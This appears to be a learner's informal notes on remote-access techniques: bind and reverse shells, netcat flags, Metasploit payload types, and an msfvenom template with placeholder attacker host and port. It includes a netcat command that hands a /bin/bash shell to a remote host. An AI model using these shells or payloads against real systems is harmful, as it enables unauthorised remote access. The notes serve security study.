## remote access
a. Bind shell: need the ip address of tearget ip address.
b. Reverse shell: redshell.
## Netcat/nc
- a command line tools to read/write.
- netcat -lvp 2222 
- the options are : 
    - -l:listen
    - -v:verbose
    - -p: port
    - -n: No-Dns resolution
- to connect to anyport : nc ipaddress portnumber -e /bin/bash
## payloads
it is a code or command that are deliver and exicuted to perform action.
- os/shell/connection
- in connection part there is : 
    reverse or Bind https: similar but for encryption.
- os/meterpreter/reverse_tcp
- there are two kind of payloads
    1. stage payload deliver in multiple part.
     - os/meterpreter/Bind_tcp
    1. Non-stage payload deliver in one parts.
    - os/meterpreter_Bind_tcp
## Metasploit
it have:
 - Exploits,
 - payloads
 - Auxiliaries
 - Encoders
 - listeners
 - post-exploitation code
 ### there is two use
 - making payload
 - Exploiting vulnerability
 ## msfvenom 
 - msfvenom -p "payload" Lhost= Attacker ip address Lport="port adress" -f "format" -o name.format.